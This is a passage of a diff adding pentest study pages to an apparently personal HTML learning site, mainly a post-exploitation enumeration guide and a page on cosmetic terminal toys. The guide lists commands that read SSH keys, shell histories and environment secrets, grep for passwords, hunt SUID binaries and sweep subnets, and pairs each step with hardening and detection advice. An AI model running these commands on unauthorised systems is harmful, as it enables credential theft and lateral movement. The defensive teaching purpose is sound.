+# membership, drop unneeded SUID bits, use capabilities narrowly, monitor 'sudo -l' at scale.</pre>
+
+<h3>System profile &mdash; what am I running on?</h3>
+<p><strong>What / why.</strong> Kernel version and distro drive which local-privesc exploits apply; installed software and running services are the local attack surface; scheduled tasks are a classic escalation and persistence vector.</p>
+<pre>$ uname -a                          # kernel release + arch -> match against known local-privesc CVEs
+$ cat /etc/os-release ; hostnamectl ; lsb_release -a 2>/dev/null
+$ cat /proc/version ; arch ; getconf LONG_BIT
+$ ps auxww                          # every process + full args (creds on command lines, root daemons)
+$ ps -eo pid,user,cmd --sort=user
+$ systemctl list-units --type=service --state=running   # or: service --status-all
+$ cat /etc/crontab ; ls -la /etc/cron.* /var/spool/cron/crontabs 2>/dev/null   # writable script run by root?
+$ dpkg -l 2>/dev/null | head ; rpm -qa 2>/dev/null | head   # installed packages/versions
+$ mount ; cat /etc/fstab ; df -h                            # nfs/nosuid?, extra disks, creds in fstab
+# defensive mirror: patch the kernel/packages (kills the CVE list), least-functionality (remove
+# unused services), lock down cron script permissions, nosuid/nodev on data mounts, file-integrity
+# monitoring on cron dirs and SUID files.</pre>
+
+<h3>Network position &mdash; what can this box reach?</h3>
+<p><strong>What / why.</strong> The compromised host is a pivot. Its listening services may expose more; its routes, ARP/neighbour table, and reachable hosts define the next hop; DNS and <code>/etc/hosts</code> reveal internal names.</p>
+<pre>$ ss -tulpen                        # listening TCP/UDP sockets + owning process + user (needs privs for -p)
+$ ss -tanp                          # established connections (who is this box already talking to?)
+$ lsof -i -P -n 2>/dev/null         # same idea via lsof: open network files / listeners
+$ ip a ; ip r ; ip neigh           # interfaces, routing table, ARP/neighbour cache (nearby live hosts)
+$ cat /etc/resolv.conf /etc/hosts   # internal DNS servers, hard-coded internal names
+$ cat /proc/net/tcp 2>/dev/null     # listeners even without ss/netstat (hex, decode ports)
+$ for i in $(seq 1 254); do (ping -c1 -W1 10.0.0.$i &amp;>/dev/null &amp;&amp; echo 10.0.0.$i up) &amp; done; wait  # tiny sweep
+# defensive mirror: host firewall default-deny (in AND out), network segmentation so a foothold
+# can't scan/reach the estate, no secrets in resolv.conf/hosts, egress filtering to break C2/pivot,
+# monitor east-west connection attempts and new listeners.</pre>
+
+<h3>Credentials &amp; sensitive files &mdash; the fast path onward</h3>
+<p><strong>What / why.</strong> Reused credentials and forgotten secrets escalate or move laterally faster than any kernel exploit. Look in histories, config files, backups, environment, keys, and world-readable spots &mdash; without trampling data you're not authorised to touch.</p>
+<pre>$ cat ~/.bash_history ~/.zsh_history 2>/dev/null            # passwords typed on the CLI
+$ env ; cat /proc/1/environ 2>/dev/null | tr '\0' '\n'      # secrets in environment
+$ ls -la ~/.ssh ; cat ~/.ssh/id_* ~/.ssh/config ~/.ssh/authorized_keys 2>/dev/null
+$ grep -RniE 'password|passwd|secret|api[_-]?key|token' /etc /opt /var/www 2>/dev/null | head
+$ find / -name '*.kdbx' -o -name 'id_rsa' -o -name '*.pem' -o -name '.env' 2>/dev/null
+$ cat /var/www/*/config*.php /opt/*/application.{properties,yml} 2>/dev/null    # DB creds in app config
+$ find / -writable -type d 2>/dev/null | grep -vE '^/(proc|sys)' | head          # where can I write?
+$ getent passwd ; ls -la /home/*                                                 # other users to target
+# defensive mirror: secrets in a vault (not files/env/history), disable shell history for service
+# accounts or scrub it, tight file perms on app config, unique creds per host/service (no reuse),
+# SSH keys with passphrases + short-lived certs, DLP/AV on credential-file patterns, monitor mass
+# 'grep -R' / reads of many config files by an unusual process.</pre>
+
+<h3>Discipline &amp; the defensive summary</h3>
+<ul>
+<li><strong>Stay in scope</strong>: enumeration is fine; don't read customer data, don't run destructive commands, don't add persistence without written sign-off, and log every command with timestamps for the report.</li>
+<li><strong>Be quiet</strong>: prefer built-ins to uploaded scripts; avoid noisy sweeps on monitored networks; know that <code>find / -perm -4000</code>, mass <code>grep -R</code>, and ping sweeps are detectable.</li>
+<li><strong>Windows equivalents</strong> (for completeness): <code>whoami /all</code>, <code>whoami /priv</code>, <code>net user</code>/<code>net localgroup administrators</code>, <code>systeminfo</code>, <code>tasklist /svc</code>, <code>netstat -ano</code>, <code>ipconfig /all</code>, <code>route print</code>, <code>schtasks /query</code>, <code>cmdkey /list</code>, and <code>Get-*</code> PowerShell cmdlets.</li>
+<li><strong>The whole defensive point</strong>: least privilege (so the account can't do much), aggressive patching (so <code>uname -a</code> yields no exploit), no stray secrets (so credential hunting comes up empty), segmentation + egress filtering (so the pivot goes nowhere), and endpoint/audit logging (so all this enumeration lights up a dashboard). A well-run host makes a foothold a dead end.</li>
+</ul>
+</div></details>
+
+<details class="section"><summary>Cheat Sheet</summary><div class="section-body">
+<ul>
+<li><strong>Identity/privs</strong>: <code>whoami</code>, <code>id</code>, <code>sudo -l</code>, <code>groups</code> (docker/lxd/disk/adm = danger), <code>getcap -r / 2&gt;/dev/null</code>, <code>find / -perm -4000 -type f 2&gt;/dev/null</code> (SUID &rarr; GTFOBins).</li>
+<li><strong>System</strong>: <code>uname -a</code> + <code>/etc/os-release</code> (&rarr; local-privesc CVEs), <code>ps auxww</code>, <code>systemctl list-units --state=running</code>, <code>cat /etc/crontab</code> + <code>ls -la /etc/cron.*</code>, <code>mount</code>/<code>fstab</code>.</li>
+<li><strong>Network</strong>: <code>ss -tulpen</code> / <code>lsof -i -P -n</code> (listeners + owner), <code>ss -tanp</code> (established), <code>ip a</code>/<code>ip r</code>/<code>ip neigh</code>, <code>/etc/resolv.conf</code> + <code>/etc/hosts</code>.</li>
+<li><strong>Creds/files</strong>: <code>~/.bash_history</code>, <code>env</code> / <code>/proc/1/environ</code>, <code>~/.ssh/*</code>, <code>grep -RniE 'password|secret|api_key|token' /etc /opt /var/www</code>, <code>find / -name '*.env' -o -name 'id_rsa' -o -name '*.kdbx'</code>, <code>find / -writable -type d</code>.</li>
+<li>Prefer built-ins over uploaded enum scripts (quieter). Watch for detectable actions: SUID hunts, mass grep, ping sweeps.</li>
+<li>In scope only: no data access, no destructive commands, no persistence without sign-off; log everything.</li>
+<li><strong>Defensive mirror</strong>: least privilege + patch kernel/packages + secrets in a vault + segmentation & egress filtering + auditd/EDR alerting = foothold becomes a dead end.</li>
+</ul>
+</div></details>
+
+<details class="section"><summary>Q&amp;A</summary><div class="section-body">
+<dl class="qa">
+<dt>You land a shell. What are the first two commands and why?</dt>
+<dd><code>id</code> (and <code>whoami</code>) then <code>sudo -l</code>. <code>id</code> tells you your UID/GID and &mdash; crucially &mdash; supplementary groups: UID 0 means you're already root; membership in <code>docker</code>, <code>lxd</code>, <code>disk</code>, <code>adm</code>, or <code>sudo</code>/<code>wheel</code> is often a direct or near-direct path to root. <code>sudo -l</code> shows exactly which commands you can run as another user (often root), and whether a password is required &mdash; a misconfigured sudo rule (NOPASSWD, a wildcard, or a binary that can shell out) is the fastest, quietest escalation there is.</dd>
+<dt>Why is <code>uname -a</code> one of the first things checked?</dt>
+<dd>The kernel release and architecture determine which <em>local privilege-escalation</em> exploits could apply. An old kernel with a known LPE (Dirty COW, Dirty Pipe, OverlayFS bugs, nf_tables, etc.) can take a low-priv shell straight to root. Combined with <code>/etc/os-release</code> (distro + version pins the exact package set) you can shortlist candidate exploits before trying anything. The defensive corollary: a fully patched kernel makes this check yield nothing.</dd>
+<dt>What's the difference between <code>ss -tulpen</code> and <code>ss -tanp</code> for enumeration?</dt>
+<dd><code>ss -tulpen</code> shows <em>listening</em> TCP/UDP sockets with the owning process and user (and extended info) &mdash; that's the box's local service attack surface, including services bound only to <code>127.0.0.1</code> that aren't reachable from outside but are reachable from your shell (a common privesc: a root-owned admin service on localhost). <code>ss -tanp</code> shows <em>established</em> connections &mdash; who this host is already talking to, which reveals internal peers, databases, and management hosts to target for lateral movement. You want both: what's listening here, and what this box connects to.</dd>
+<dt>Where do you look for credentials that let you move on without an exploit?</dt>
+<dd>Shell history (<code>~/.bash_history</code>, <code>~/.zsh_history</code> &mdash; people paste passwords into commands), environment variables (<code>env</code>, <code>/proc/&lt;pid&gt;/environ</code> of running services), SSH material (<code>~/.ssh/id_*</code>, <code>config</code>, <code>known_hosts</code> for where keys are used), application config files (DB connection strings in <code>config.php</code>, <code>application.properties</code>, <code>.env</code>, <code>web.config</code>), backup files and archives, world-readable files in <code>/opt</code>/<code>/var</code>, password managers (<code>*.kdbx</code>), cloud credential files (<code>~/.aws/credentials</code>), and CI/deploy scripts. A recursive <code>grep</code> for <code>password|secret|token|api_key</code> across <code>/etc</code>, <code>/opt</code>, and web roots is the fast sweep. Reused or over-scoped credentials found this way are frequently the actual root cause of a full compromise.</dd>
+<dt>From a defender's side, how do you catch this enumeration activity?</dt>
+<dd>It's high-signal if you're watching: (1) <strong>auditd / Sysmon-for-Linux / EDR</strong> rules for execution of recon commands (<code>id</code>, <code>whoami</code>, <code>sudo -l</code>, <code>uname</code>, <code>ss</code>, <code>netstat</code>, <code>find ... -perm -4000</code>, mass <code>grep -R</code>) especially by a web/app service account or from a process with an unusual parent (a shell spawned by nginx/php-fpm/java). (2) <strong>SUID/SGID enumeration</strong> and reads of many config files in a short window. (3) <strong>New listening sockets</strong> or outbound connections from a server that shouldn't initiate them (egress monitoring). (4) <strong>Internal port scans / ping sweeps</strong> from a host via NetFlow/Zeek. (5) <strong>Failed sudo</strong> and privilege-change events. (6) Uploaded enum tooling (linpeas/pspy) &mdash; file writes to <code>/tmp</code> + execution + world of recon syscalls. Correlate: "app account spawned a shell, then ran id/sudo -l/uname, then scanned the subnet" is a near-certain compromise. The controls that make it moot are still primary (least privilege, patching, no secrets, segmentation), but this activity should also page someone.</dd>
+</dl>
+</div></details>
+
+<details class="section"><summary>Interview Questions</summary><div class="section-body">
+<div class="qlevel">
+<h4>Basic <span class="lvl-tag">warm-up</span></h4>
+<details class="answer-reveal"><summary>What does <code>id</code> tell you that <code>whoami</code> doesn't?</summary><div class="answer-box">
+<code>whoami</code> is just the username. <code>id</code> adds the numeric UID (0 = root), the primary GID, and &mdash; most usefully for enumeration &mdash; all supplementary group memberships (e.g. <code>docker</code>, <code>sudo</code>, <code>adm</code>, <code>disk</code>), several of which are escalation paths.
+</div></details>
+<details class="answer-reveal"><summary>Which command lists listening ports and the process behind each?</summary><div class="answer-box">
+<code>ss -tulpen</code> (or <code>lsof -i -P -n</code>, or legacy <code>netstat -tulpen</code>). The <code>-p</code> part (process/owner) needs sufficient privileges to see all processes.
+</div></details>
+</div>
+<div class="qlevel">
+<h4>Intermediate <span class="lvl-tag">core</span></h4>
+<details class="answer-reveal"><summary>You have a low-priv shell as the <code>www-data</code> user on an authorised target. Give a structured 10-minute enumeration plan.</summary><div class="answer-box">
+<strong>0&ndash;1 min &mdash; identity/privs</strong>: <code>id</code>, <code>sudo -l</code> (and <code>sudo -n true</code>), <code>groups</code>. If <code>www-data</code> is in <code>docker</code>/<code>lxd</code> or sudo lets it run something &mdash; escalate there and stop. <strong>1&ndash;3 min &mdash; quick wins</strong>: <code>getcap -r / 2&gt;/dev/null</code>, <code>find / -perm -4000 -type f 2&gt;/dev/null</code> (cross-ref GTFOBins), writable files/dirs in <code>PATH</code> and in cron dirs (<code>ls -la /etc/cron*</code>, <code>cat /etc/crontab</code> &mdash; a root cron running a <code>www-data</code>-writable script is instant root). <strong>3&ndash;5 min &mdash; system</strong>: <code>uname -a</code> + <code>/etc/os-release</code> (shortlist kernel LPEs), <code>ps auxww</code> (root services, creds on cmdlines, an internal admin daemon), <code>ss -tulpen</code> (localhost-only root services this shell can reach). <strong>5&ndash;7 min &mdash; app credentials</strong>: this is a web account, so <code>cat /var/www/*/config*.*</code>, <code>.env</code>, framework config &rarr; almost always DB creds; <code>mysql -u.. -p..</code> / check for password reuse to a system user; look in <code>/var/backups</code>, deploy scripts, <code>~/.bash_history</code> of any readable home. <strong>7&ndash;9 min &mdash; pivot recon</strong>: <code>ip a/r/neigh</code>, <code>/etc/hosts</code>/<code>resolv.conf</code>, <code>ss -tanp</code> (what this box talks to &mdash; DB host, internal APIs), a light subnet ping loop if the network isn't heavily monitored. <strong>9&ndash;10 min &mdash; decide</strong>: pick the most reliable, least-noisy path (usually: a sudo/cron/SUID misconfig, or reused DB/app creds &rarr; a real user &rarr; then kernel exploit only if needed), note everything with timestamps, and confirm the target is in scope before acting. Throughout: prefer built-ins, don't touch data, no persistence without sign-off.</dd>
+</div></details>
+</div>
+<div class="qlevel">
+<h4>Advanced <span class="lvl-tag">deep</span></h4>
+<details class="answer-reveal"><summary>Design host hardening and detection so that a foothold as a service account yields nothing useful from enumeration and privilege escalation.</summary><div class="answer-box">
+<strong>Least privilege &amp; least functionality</strong>: service accounts are non-login (<code>/usr/sbin/nologin</code>), own only their own files, are in no privileged groups, have <em>no</em> sudo rights (or one tightly-scoped NOPASSWD to a single non-shell-capable binary at most), and run under systemd hardening (<code>NoNewPrivileges</code>, <code>ProtectSystem=strict</code>, <code>PrivateTmp</code>, <code>ProtectHome</code>, <code>CapabilityBoundingSet=</code> empty or minimal, <code>SystemCallFilter</code>, <code>ReadOnlyPaths</code>, <code>RestrictAddressFamilies</code>). Remove compilers, package managers where feasible, and unused SUID binaries (<code>chmod u-s</code> or <code>dpkg-statoverride</code>); mount <code>/tmp</code>, <code>/var/tmp</code>, <code>/dev/shm</code> and data volumes <code>noexec,nosuid,nodev</code>. <strong>Patch aggressively</strong>: automated kernel and package updates with live-patching where possible &mdash; so <code>uname -a</code> maps to no known LPE. <strong>No stray secrets</strong>: all credentials from a secrets manager injected at runtime into memory/tmpfs, never in files, env dumped to logs, or images; disable shell history for service contexts; app config files readable only by the service user and containing references, not secrets; unique per-host credentials (no reuse), short-lived where possible. <strong>Filesystem</strong>: app code read-only to the service account; no world-writable dirs; cron/systemd-timer scripts owned by root and not writable by anyone else; file-integrity monitoring (AIDE/auditd watches) on SUID files, cron dirs, <code>/etc</code>, and app binaries. <strong>Network containment</strong>: host firewall default-deny inbound <em>and outbound</em> (allow only the exact peers/ports the service needs &mdash; DB, dependencies), so a foothold can't scan, pivot, or call out for C2/tooling; network segmentation and microsegmentation so even allowed traffic can't reach the crown jewels; no route to cloud metadata (or IMDSv2 with hop limit) so cloud creds aren't harvestable. <strong>Containerise / isolate</strong> where it fits: run the service in a container or micro-VM as non-root with dropped caps, read-only rootfs, seccomp &mdash; a shell inside is already boxed. <strong>Detection</strong>: auditd/Falco/EDR rules for (1) a shell or interpreter spawned by the service process (nginx/php-fpm/java &rarr; <code>sh</code>/<code>bash</code>/<code>python</code>), (2) recon command execution by the service account (<code>id</code>, <code>sudo -l</code>, <code>uname</code>, <code>ss</code>, <code>find -perm -4000</code>, mass <code>grep -R</code>), (3) reads of many config/credential files or of <code>/etc/shadow</code>, (4) new listeners or outbound connections from the host, (5) writes to <code>/tmp</code> followed by execution, (6) any successful privilege change. Ship to the SIEM, alert on the sequence, and cross-correlate with the app's own logs. <strong>Validate</strong>: periodically drop an authorised low-priv shell on a clone and confirm enumeration comes up empty and every step generated an alert. Net: non-login least-privilege service accounts under systemd sandboxing on patched, minimal hosts with no local secrets and default-deny egress, ideally containerised &mdash; plus behavioural detection on shell-spawns and recon commands so the (contained, unproductive) foothold still pages the SOC.</dd>
+</div></details>
+</div>
+</div></details>
+
+</div></div>
+</section>
+<!-- /TOPIC:pentest:post-exploitation -->
+
+<!-- TOPIC:pentest:terminal-toys -->
+<section class="view topic" id="v-pentest-terminal-toys" data-skill="pentest">
+<div class="layout">
+<nav class="sidebar" data-sidebar="pentest"></nav>
+<div class="topic-body">
+<h1>Terminal Toys: hollywood &amp; cmatrix</h1>
+<p class="subtitle">Purely cosmetic screen effects &mdash; fake "hacker" dashboards and Matrix rain. Fun for a demo or a screensaver; they do nothing, and running one is not "hacking".</p>
+
+<details class="section" open><summary>Notes</summary><div class="section-body">
+<figure class="diagram">
+<svg viewBox="0 0 520 120" role="img" aria-labelledby="d-pt-toys-t">
+<title id="d-pt-toys-t">These render animation to the terminal and consume input to quit; no network, no target</title>
+<rect class="d-box-alt" x="30" y="30" width="140" height="30" rx="6"/><text class="d-t-b" x="100" y="49" text-anchor="middle">hollywood / cmatrix</text>
+<rect class="d-box" x="240" y="24" width="120" height="20"/><text class="d-t-sm" x="248" y="38">draws to the TTY</text>
+<rect class="d-box" x="240" y="48" width="120" height="20"/><text class="d-t-sm" x="248" y="62">reads a keypress to quit</text>
+<rect class="d-box-soft" x="410" y="34" width="100" height="24" rx="4"/><text class="d-t-sm" x="460" y="50" text-anchor="middle">no packets sent</text>
+<path class="d-line" d="M170 45 L238 36" marker-end="url(#pt-toys-ah)"/><path class="d-line" d="M360 46 L408 46" marker-end="url(#pt-toys-ah)"/>
+<defs><marker id="pt-toys-ah" markerWidth="8" markerHeight="8" refX="7" refY="4" orient="auto"><path class="d-fill" d="M0 0 L8 4 L0 8 Z"/></marker></defs>
+<text class="d-t-sm" x="30" y="94">If someone is running these "against" a target, they are not doing anything &mdash; it's a screensaver.</text>
+</svg>
+<figcaption>Included because the source list mentioned them. They belong in the "for fun" bucket, not the toolkit &mdash; know what they are so you're not fooled by a screenshot.</figcaption>
+</figure>
+
+<h3>hollywood</h3>
+<p><strong>What / why.</strong> A shell script (ships in a snap / some distro repos) that splits your terminal with <code>byobu</code>/<code>tmux</code> into panes each running a fast-scrolling real command (a compile, <code>find</code>, <code>hexdump</code>, <code>tree</code>, package lists) so it looks like a movie "hacking" montage. It's output theatre &mdash; nothing is being attacked, scanned, or cracked.</p>
+<pre>$ sudo apt install hollywood     # or: sudo snap install hollywood
+$ hollywood                      # fills the terminal with fake-busy panes
+$ hollywood 4                    # optional: target number of split "windows"
+# quit: it's tmux/byobu underneath -> Ctrl-C in each pane, or close the terminal,
+#       or  tmux kill-server  /  pkill hollywood
+# needs byobu + tmux + a few coreutils; it just runs harmless commands loudly.</pre>
+
+<h3>cmatrix</h3>
+<p><strong>What / why.</strong> Renders the green "digital rain" from <em>The Matrix</em> in the terminal. A tiny C program using ncurses; classic use is a jokey screen-lock or a conference-booth background.</p>
+<pre>$ sudo apt install cmatrix
+$ cmatrix                        # the falling characters
+$ cmatrix -b                     # bold random characters
+$ cmatrix -s                     # "screensaver" mode: any keypress exits
+$ cmatrix -u 5                   # update delay 0-10 (higher = slower)
+$ cmatrix -C red                 # colour: green(default)/red/blue/white/yellow/cyan/magenta/black
+$ cmatrix -r                     # rainbow
+# quit: press 'q' (or any key with -s). Ctrl-C also works.
+# related toys: sl (steam locomotive), pipes.sh, cowsay, lolcat, asciiquarium, no more secrets (nms), genact.</pre>
+
+<h3>Why this matters (a little)</h3>
+<ul>
+<li><strong>Media literacy</strong>: "hacking" scenes in film/TV &mdash; and a lot of social-media "hacker" clips &mdash; are exactly this: <code>cmatrix</code>, <code>hollywood</code>, <code>genact</code>, or a scrolling <code>nmap</code>. Real offensive work is slow, quiet, and mostly reading output.</li>
+<li><strong>Harmless</strong>: no network activity, no privilege needs, no target &mdash; safe to run anywhere you're allowed to run software. The only "risk" is CPU/terminal noise and looking silly on a shared screen.</li>
+<li><strong>Don't confuse effort with effect</strong>: a busy-looking terminal proves nothing. Evidence in a real assessment is specific &mdash; a command, its output, a screenshot of the actual finding.</li>
+</ul>
+</div></details>
+
+<details class="section"><summary>Cheat Sheet</summary><div class="section-body">
+<ul>
+<li><strong>hollywood</strong>: <code>sudo snap install hollywood</code> (or apt) &rarr; <code>hollywood [N]</code>. It's tmux/byobu running harmless commands in split panes. Quit: <code>Ctrl-C</code> / close terminal / <code>pkill hollywood</code> / <code>tmux kill-server</code>.</li>
+<li><strong>cmatrix</strong>: <code>sudo apt install cmatrix</code> &rarr; <code>cmatrix</code>. Flags: <code>-s</code> (any key exits), <code>-b</code> bold, <code>-r</code> rainbow, <code>-C &lt;colour&gt;</code>, <code>-u 0..10</code> speed. Quit: <code>q</code> or <code>Ctrl-C</code>.</li>
+<li>Both are cosmetic: no network, no target, no privileges. Not tools, not "hacking".</li>
+<li>Other toys: <code>sl</code>, <code>pipes.sh</code>, <code>cowsay</code>/<code>lolcat</code>, <code>asciiquarium</code>, <code>nms</code> ("no more secrets"), <code>genact</code>.</li>
+<li>Takeaway: on-screen busyness &ne; results. Real findings are specific commands + outputs + evidence.</li>
+</ul>
+</div></details>
+
+<details class="section"><summary>Q&amp;A</summary><div class="section-body">
+<dl class="qa">
+<dt>Does running <code>hollywood</code> or <code>cmatrix</code> do anything to a network or a target?</dt>
+<dd>No. They only draw animation to your terminal and read a keypress to exit. There is no network traffic, no scanning, no exploitation &mdash; they're the equivalent of a screensaver. Anyone presenting one as "hacking" is doing nothing.</dd>
+<dt>How do you exit each one?</dt>
+<dd><strong>cmatrix</strong>: press <code>q</code> (or any key if started with <code>-s</code>), or <code>Ctrl-C</code>. <strong>hollywood</strong>: it runs inside tmux/byobu, so <code>Ctrl-C</code> in each pane, close the terminal window, or from another shell <code>pkill hollywood</code> / <code>tmux kill-server</code>.</dd>
+<dt>Why is it worth knowing these exist?</dt>
+<dd>Media literacy. Most "hacker terminal" footage in films and viral clips is one of these (or a scrolling <code>nmap</code>/<code>genact</code>). Recognising the aesthetic keeps you from being impressed by &mdash; or fooled by &mdash; a screenshot of a busy green terminal. Real offensive security is methodical and mostly undramatic.</dd>
+</dl>
+</div></details>
+
+<details class="section"><summary>Interview Questions</summary><div class="section-body">
+<div class="qlevel">
+<h4>Basic <span class="lvl-tag">warm-up</span></h4>
+<details class="answer-reveal"><summary>What category do <code>hollywood</code> and <code>cmatrix</code> belong to?</summary><div class="answer-box">
+Terminal eye-candy / screen effects &mdash; cosmetic toys. They are not security tools and perform no offensive or defensive function.
+</div></details>
+<details class="answer-reveal"><summary>What does <code>cmatrix -s</code> do?</summary><div class="answer-box">
+Runs it in "screensaver" mode &mdash; it exits on <em>any</em> keypress rather than only on <code>q</code>.
+</div></details>
+</div>
+<div class="qlevel">
+<h4>Intermediate <span class="lvl-tag">core</span></h4>
+<details class="answer-reveal"><summary>A "proof of hack" video shows a rapidly scrolling green terminal. How do you evaluate the claim?</summary><div class="answer-box">
+Treat the visuals as meaningless and ask for concrete evidence. A scrolling terminal could be <code>cmatrix</code>, <code>hollywood</code>, <code>genact</code>, <code>nms</code>, a <code>cat</code> of a big file, or a legitimate but unremarkable command &mdash; the animation proves nothing. Real proof of a compromise is specific and reproducible: the exact target and scope authorisation, the vulnerability (CVE or class) and where it was, the request/payload used, the resulting access (a shell prompt showing <code>id</code>/<code>hostname</code> on the target, a specific file retrieved, a screenshot tied to the target's unique content), timestamps, and ideally steps to reproduce. If someone can't produce that and only has "look how fast the text goes", there's no substantiated claim.</dd>
+</div></details>
+</div>
+<div class="qlevel">
+<h4>Advanced <span class="lvl-tag">deep</span></h4>
+<details class="answer-reveal"><summary>Why does the gap between "looks like hacking" and "is security work" matter for how organisations assess and hire security talent?</summary><div class="answer-box">
+Because optics are a poor proxy for capability, and confusing them leads to bad decisions. Real offensive security is slow, methodical, heavily documentation-driven, and mostly consists of reading output, understanding a system's design, and reasoning about trust boundaries &mdash; not fast typing or busy screens. Consequences of getting this wrong: (1) <strong>Hiring/assessment</strong> &mdash; evaluate candidates on methodology (scoping, threat modelling, how they'd chain findings, how they'd report and remediate, ethics/authorisation judgement) and on hands-on labs with a written report, not on demos or jargon; a great pentester's deliverable is a clear risk-ranked report a dev team can act on. (2) <strong>Program metrics</strong> &mdash; measure security by outcomes (mean-time-to-remediate, exposed-service trend, detection coverage vs ATT&amp;CK, findings that led to real fixes), not by activity theatre. (3) <strong>Culture</strong> &mdash; rewarding drama over rigour pushes people toward flashy one-off findings instead of the unglamorous work that actually reduces risk (patch pipelines, segmentation, secret management, detection engineering, secure defaults). (4) <strong>Defence</strong> &mdash; teams that expect attacks to "look dramatic" miss the real thing, which looks like a slightly unusual login or one odd process. The mature view: value the report, the reproducibility, the judgement, and the fix &mdash; and treat the green-terminal aesthetic as entertainment.</dd>
+</div></details>
+</div>
+</div></details>
+
+</div></div>
+</section>
+<!-- /TOPIC:pentest:terminal-toys -->
+
 </main>
 
 <footer class="site-footer">
@@ -41256,7 +42206,8 @@ Two passes. <strong>Pass 1 &mdash; discovery</strong>: <code>nmap -sn -n -PE -PS
     containers:  { name: "Containers &amp; Isolation",   blurb: "VMs vs containers, namespaces &amp; cgroups, image layers &amp; OverlayFS, the OCI spec, runc/containerd, capabilities/seccomp, rootless." },
     docker:      { name: "Docker",                      blurb: "Client/daemon/containerd, the CLI, images &amp; registries, Dockerfiles &amp; build cache, multi-stage builds, volumes, networking, Compose, hardening." },
     k8s:         { name: "Kubernetes",                  blurb: "Control plane &amp; nodes, the API &amp; reconciliation, Pods, Deployments/StatefulSets, Services &amp; Ingress, ConfigMaps/Secrets, storage, scheduling, autoscaling, RBAC, Helm/GitOps." },
-    debug:       { name: "Debug &amp; Profiling Tools",  blurb: "gdb, Valgrind, strace, ltrace, gcov, nmap &mdash; what each does, the flags that matter, worked examples, and when to reach for which." }
+    debug:       { name: "Debug &amp; Profiling Tools",  blurb: "gdb, Valgrind, strace, ltrace, perf, gcov, nmap &mdash; what each does, the flags that matter, worked examples, and when to reach for which." },
+    pentest:     { name: "Network Hacking &amp; Pentest", blurb: "Recon (nmap/masscan/nc), Metasploit &amp; sqlmap, password cracking (hydra/john/hashcat), Wi-Fi (aircrack-ng/reaver), sniffing (tcpdump/tshark), post-exploitation enumeration. Authorised testing / CTF / lab only." }
   };
 
   // home-page grouping (order shown top to bottom)
@@ -41267,7 +42218,8 @@ Two passes. <strong>Pass 1 &mdash; discovery</strong>: <code>nmap -sn -n -PE -PS
     ["Design &amp; tools", ["lld", "sysd", "git"]],
     ["Observability",   ["grafana", "splunk", "monitor"]],
     ["Delivery &amp; tools", ["jira", "cdn"]],
-    ["Virtualization",  ["containers", "docker", "k8s"]]
+    ["Virtualization",  ["containers", "docker", "k8s"]],
+    ["Offensive Security", ["pentest"]]
   ];
 
   // ---- built topics: [slug, title, blurb]. Order defines sidebar order. --
@@ -41583,6 +42535,15 @@ Two passes. <strong>Pass 1 &mdash; discovery</strong>: <code>nmap -sn -n -PE -PS
       ["perf",     "perf: The Linux Profiler",         "perf stat (exact counters, IPC), perf record/report (sampling + call graphs fp/dwarf/lbr), perf top, events & PMU, flame graphs, annotate/sched/trace/lock/c2c/probe, perf_event_paranoid setup."],
       ["gcov",     "gcov: Code Coverage Analysis",     "--coverage / -fprofile-arcs -ftest-coverage, .gcno/.gcda, line & branch coverage, gcov -b/-f/-c, lcov + genhtml and gcovr reports, CI coverage gates, GCOV_PREFIX for remote/embedded."],
       ["nmap",     "nmap: Network & Port Scanning",    "Host discovery (-sn), scan types (-sS/-sT/-sU/-sA), -p / --top-ports, -sV version & -O OS detection, -A, -T timing, NSE --script, -Pn/-n, output -oA; authorized recon & firewall verification."]
+    ],
+    pentest: [
+      ["recon-scanning",    "Recon & Scanning: nmap, masscan, netcat", "Discovery + service enumeration workflow; nmap NSE, masscan for speed then nmap for detail, netcat for banner grab / raw connections / listeners. Scope & authorisation first."],
+      ["exploitation",      "Exploitation Frameworks: Metasploit & sqlmap", "msfconsole workflow (search/use/set/run), payloads & Meterpreter, msfvenom, workspaces + db_nmap; sqlmap for SQLi detection & extraction (--level/--risk, --dbs/--dump). Defensive counterparts."],
+      ["password-cracking", "Password Cracking: hydra, john, hashcat", "Online brute-force (hydra) vs offline hash cracking (john auto-detect, hashcat GPU + rules/masks); wordlists, rules, modes; why slow hashing + MFA defeat it. Own/lab/CTF hashes only."],
+      ["wireless",          "Wi-Fi Security: aircrack-ng & reaver",   "Monitor mode, airodump capture, deauth to force a handshake, dictionary crack of WPA/WPA2; reaver against WPS. Assess your OWN network. Defence: WPA3, disable WPS, long PSK, 802.1X."],
+      ["sniffing",          "Sniffing & Traffic Analysis: tcpdump & tshark", "BPF capture filters, ring buffers, writing/reading pcap; tshark display filters, follow stream, -z statistics; where a SPAN/tap is needed; TLS limits. Also a core ops/debug skill."],
+      ["post-exploitation", "Post-Exploitation Enumeration",           "After a shell: whoami / id / sudo -l / uname -a / lsof -i / ss / crontab / SUID & capability hunts / env & history / network pivots. Every command has a defensive/hardening mirror."],
+      ["terminal-toys",     "Terminal Toys: hollywood & cmatrix",      "Purely cosmetic terminal eye-candy (fake dashboards, Matrix rain) &mdash; not tools. What they are, how to run/quit them, and why they are not 'hacking'."]
     ]
   };
 
